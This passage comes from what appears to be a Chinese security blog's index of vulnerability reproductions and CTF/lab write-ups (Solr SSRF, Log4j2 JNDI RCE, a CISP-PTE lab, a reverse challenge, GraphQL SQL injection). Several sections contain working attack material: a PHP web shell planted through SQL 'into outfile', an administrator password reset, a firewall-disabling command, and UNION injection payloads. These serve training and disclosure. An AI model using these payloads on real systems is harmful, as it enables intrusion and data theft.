<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115213537111.png" class title="image-20211115213537111">



<p>我们查看DNslog平台,有DNS解析记录。</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115213646434.png" class title="image-20211115213646434">

<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
<p>Apache Solr 8.8.2官方下载地址</p>
<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web容器漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Log4j2-RCE漏洞复现</title>
    <url>/2021/12/11/Apache-Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache-Log4j2-RCE漏洞复现"></a>Apache-Log4j2-RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>



<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
<p>pom.xml文件如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>



<p>点击下载相应程序包资源</p>
<img src="/2021/12/11/Apache-Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220207115326014.png" class title="image-20220207115326014">



<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
<img src="/2021/12/11/Apache-Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220207115341295.png" class title="image-20220207115341295">



<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2021/12/11/Apache-Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220207115350383.png" class title="image-20220207115350383">



<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
<p><strong>已知影响组件</strong></p>
<ul>
<li>Apache Struts2</li>
<li>Apache Solr</li>
<li>Apache Flink</li>
<li>Apache Druid</li>
<li>ElasticSearch</li>
<li>flume</li>
<li>dubbo</li>
<li>Redis</li>
<li>logstash</li>
<li>kafka</li>
</ul>
<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
<p>2、升级至 log4j-2.15.0-rc2： </p>
<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
<p>3、紧急缓解措施： </p>
<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web容器漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>CISP-PTE综合题靶场</title>
    <url>/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="CISP-PTE综合题靶场"><a href="#CISP-PTE综合题靶场" class="headerlink" title="CISP-PTE综合题靶场"></a>CISP-PTE综合题靶场</h1><p>由于题目中只给了靶机的ip地址，没有给出开放的web端口，需要进行前期的信息收集判断开放的端口服务。</p>
<p>首先使用扫描工具Nmap对靶机IP地址进行端口扫描，开放125端口</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630133402162.png" class title="image-20220630133402162">



<p>接下来访问目标端口<a href="http://172.16.12.100:125/">http://172.16.12.100:125</a> ，访问时弹出HTTP Authenrization认证窗口，这里可以对其进行爆破，由于已知账号密码(admin&#x2F;qwerty)直接登录</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630133457193.png" class title="image-20220630133457193">



<p>登陆成功后进入后台页面，此时我们对该登录后台进行暴力破解或者弱口令登录，未果</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630133620646.png" class title="image-20220630133620646">



<p>尝试对该Web目录进行路径扫描，判断其他存在的Web路径</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630134855634.png" class title="image-20220630134855634">



<p>由上图可得存在rebots.txt路径和news&#x2F;目录</p>
<p>访问rebots.txt路径返回网站地图和key值{yuio243}</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630134949155.png" class title="image-20220630134949155">



<p>访问news目录，可以看到是个留言反馈系统</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630135129805.png" class title="image-20220630135129805">



<p>我们继续对该目录下的Web路径进行扫描，存在phpmyadmin路径</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630135302575.png" class title="image-20220630135302575">



<p>由于该Phpmyadmin未作认证，直接访问进入</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630135404541.png" class title="image-20220630135404541">



<p>下面我们来观察该数据库中是否存在key值或者修改相关数据库中管理员账号的密码</p>
<p>第二种解法：在phpmyadmin中使用SQ语句写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);&gt;&quot; into outfile &#x27;c:/wamp/www/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630143418339.png" class title="image-20220630143418339">



<p>写入成功后，我们来访问上传的木马文件,命令执行成功</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630143443003.png" class title="image-20220630143443003">



<p>使用冰蝎进行连接，在网站根目录下存在key.php</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630144840547.png" class title="image-20220630144840547">



<p>读取key.php得到key值{fghj4567}</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630150051988.png" class title="image-20220630150051988">



<p>接下来进行提权，连接目标电脑的远程桌面进行提权，通过命令行可以看出目标主机开启3389端口。</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630150155548.png" class title="image-20220630150155548">



<p>由于我们不知道目标主机的账号密码，我们需要创建或者修改用户管理员administrator的密码进行远程桌面登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator Admin12345</span><br></pre></td></tr></table></figure>

<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630150335943.png" class title="image-20220630150335943">



<p>防止目标主机开启防火墙后被拦截，关闭其防火墙，判断目标主机操作系统版本来执行相应的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo //查看操作系统</span><br></pre></td></tr></table></figure>

<p>目标操作系统为win 2008</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630150754348.png" class title="image-20220630150754348">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off//关闭防火墙</span><br></pre></td></tr></table></figure>

<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630151005055.png" class title="image-20220630151005055">



<p>然后再命令行中输入mstsc进入远程桌面登录框，输入账号密码administrator&#x2F;Admin12345</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630151117935.png" class title="image-20220630151117935">



<p>连接远程桌面成功</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630151155900.png" class title="image-20220630151155900">



<p>可以看到key值{zxcvasdf}</p>
<img src="/2022/06/30/CISP-PTE%E7%BB%BC%E5%90%88%E9%A2%98%E9%9D%B6%E5%9C%BA/image-20220630151225726.png" class title="image-20220630151225726">]]></content>
      <categories>
        <category>证书</category>
        <category>cisp-pte</category>
      </categories>
      <tags>
        <tag>-考证 -cisp-pte -Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF练习-Reverse系列-HighwayHash64</title>
    <url>/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/</url>
    <content><![CDATA[<h1 id="CTF练习-Reverse系列-HighwayHash64"><a href="#CTF练习-Reverse系列-HighwayHash64" class="headerlink" title="CTF练习-Reverse系列-HighwayHash64"></a>CTF练习-Reverse系列-HighwayHash64</h1><p>这道题运用highwayhash64算法，需要爆破hash的题目。程序首先对flag的长度进行hash校验，然后对flag里的数字进行校验，所以首先需要爆破flag长度，然后爆破flag内容。这里有两种方法，一种是修改源码进行源码，另外一种是直接修改exe为dll注入来爆破。</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目探测"><a href="#题目探测" class="headerlink" title="题目探测"></a>题目探测</h3><p>这道题目所用的附件为一个exe文件，结果如下:</p>
<p>显示题目描述为: hxb2018{xxxxx}。需要输入一串数字flag，输入其他字符串时提示退出。</p>
<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323191950892.png" class title="image-20220323191950892">



<p>首先判断该程序是否加壳以及程序位数，若经过加壳处理需要通过脱壳处理。</p>
<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323192405521.png" class title="image-20220323192405521">

<p>得出该程序为64位未加壳程序</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>将程序通过IDA打开该程序,在左边框中找到main主函数，然后按TAB键反汇编获得函数</p>
<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401164832157.png" class title="image-20220401164832157">

<p>我们来分析下这个程序流程。</p>
<p>首先可以得出sub_140001880函数为控制台的输出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;Please enter flag(Note:hxb2018&#123;digital&#125;:&quot;);</span><br></pre></td></tr></table></figure>

<p>然后通过gets_s()函数从标准的输入中读取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gets_s(Buffer, 0x104ui64);</span><br><span class="line">//gets_s(words,STLEN);</span><br></pre></td></tr></table></figure>

<p>这里的长度限制为int(‘0x104’,’16’)&#x3D;260，当输入行太长时会丢弃输入行的其余字符，剩余的字符留在缓冲区成为下一读取语句的输入</p>
<p>接下来查看sub_1400017A0函数，一个应该为输入的字符串，第二个为输入值的长度16进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(v7, 4i64) != 0xD31580A28DD8E6C4ui64 )</span><br></pre></td></tr></table></figure>

<p>下面也调用了该函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(&amp;Buffer[8], (unsigned int)v3) != 0xC886BDF39CB4ED72ui64 )</span><br></pre></td></tr></table></figure>

<p>当判断成功时，会输出成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;successful!\nplease entry any key exit...&quot;);</span><br></pre></td></tr></table></figure>

<p>大致的意思应该为计算输入字符串进行哈希计算，然后判断是否为0xD31580A28DD8E6C4ui64，经后续判断为HighwayHash64摘要计算。</p>
<h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><blockquote>
<p>这里想到的解题思路为调用HighwayHash64算法对输入字符串进行爆破，当计算结果为0xD31580A28DD8E6C4ui64时即可</p>
</blockquote>
<p><a href="https://github.com/google/highwayhash">HighwayHash64</a></p>
<p>这里首先跟进下sub_1400017A0函数，判断是否和HighwayHash64算法一致。</p>
<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401182609549.png" class title="image-20220401182609549">

]]></content>
      <categories>
        <category>CTF</category>
        <category>逆向</category>
        <category>HighwayHash64</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse -HighwayHash64</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF练习-Web系列-SQLI（一）</title>
    <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="CTF学习-Web系列（一）-Graphql注入"><a href="#CTF学习-Web系列（一）-Graphql注入" class="headerlink" title="CTF学习-Web系列（一）-Graphql注入"></a>CTF学习-Web系列（一）-Graphql注入</h1><h2 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h2><p><a href="http://10.0.25.109:20080/">http://10.0.25.109:20080/</a></p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315131714807.png" class title="image-20220315131714807">

<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>首先对其搜索框进行注入点探测，服务器返回错误信息</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315131956077.png" class title="image-20220315131956077">



<p>然后查看题目前端 JS代码，观察是否存在有用接口信息。</p>
<p>和上面burp拦截到的请求一样，并没有发现突破点，但看到了Graphql这个关键词，于是去看了下相关知识。</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315132845150.png" class title="image-20220315132845150">



<p><strong>第一步:构造语法查询模式和类型</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">     __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">           name</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可发现API返回信息中存在Getscorebyname和Getscorebyid</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315144558291.png" class title="image-20220315144558291">



<p><strong>第二步:查询可使用的名称</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">     __type(name:<span class="string">&quot;Query&quot;</span>)&#123;</span><br><span class="line">           name </span><br><span class="line">           fields</span><br><span class="line">           &#123;</span><br><span class="line">            name</span><br><span class="line">            type</span><br><span class="line">           &#123;</span><br><span class="line">          name</span><br><span class="line">          kind</span><br><span class="line">          ofType&#123;</span><br><span class="line">           name</span><br><span class="line">           kind</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可通过响应包中获取到对象getscorewithname和getscorewithid</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315145941819.png" class title="image-20220315145941819">



<p><strong>第三步:查询Getscorebyid的详细参数</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">    &#x27;__type&#x27;: &#123;</span><br><span class="line">        &#x27;name&#x27;:&#x27;Getscorebyid&#x27;,</span><br><span class="line">         &#x27;fields&#x27;: [</span><br><span class="line">            &#123;</span><br><span class="line">               &#x27;name&#x27;:&#x27;score&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">              &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">              &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">              &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;name&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">              &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">              &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">              &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;id&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">            &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">            &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">            &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第四步:查询Getscorebyname的详细参数</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">    &#x27;__type&#x27;: &#123;</span><br><span class="line">        &#x27;name&#x27;:&#x27;Getscorebyname&#x27;,</span><br><span class="line">         &#x27;fields&#x27;: [</span><br><span class="line">            &#123;</span><br><span class="line">               &#x27;name&#x27;:&#x27;score&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                      &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                      &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                      &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;name&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                     &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                     &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                     &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;userid&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                     &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                     &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                     &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><p>构造getscorewithid()请求数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;Alice&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>返回查询结果</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315152626025.png" class title="image-20220315152626025">



<p>对getscorewithname()进行注入测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT &#x27;aaa&#x27;||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应包中返回aaa，证明查询语句成功执行，存在注入</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315153100858.png" class title="image-20220315153100858">



<p>查询数据库版本</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:<span class="string">&quot;&#x27; UNION SELECT sqlite_version()||&#x27;&quot;</span>)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数据库版本为3.31.1</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315155804488.png" class title="image-20220315155804488">





<p>构造查询数据获取表名flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT (SELECT group_concat(name,0x7e) from sqlite_master)||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315153747737.png" class title="image-20220315153747737">



<p>获取flag数据表的字段值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT (SELECT flag from flag)||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315154117172.png" class title="image-20220315154117172">

<p>得到flag为：flag{Rea1_flag_1s_Me}</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/wy_97/article/details/110522150">渗透测试之graphQL_Sp4rkW的博客-CSDN博客_graphql注入</a></p>
<p><a href="https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>-CTF -Web -Graphql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF练习-Web系列-XSS</title>
    <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/</url>
    <content><![CDATA[<h1 id="CTF学习-Web系列-XSS"><a href="#CTF学习-Web系列-XSS" class="headerlink" title="CTF学习-Web系列-XSS"></a>CTF学习-Web系列-XSS</h1><p>这里记录下XSS类型的CTF题目</p>
<h2 id="XSS0"><a href="#XSS0" class="headerlink" title="XSS0"></a>XSS0</h2><p>题目描述</p>
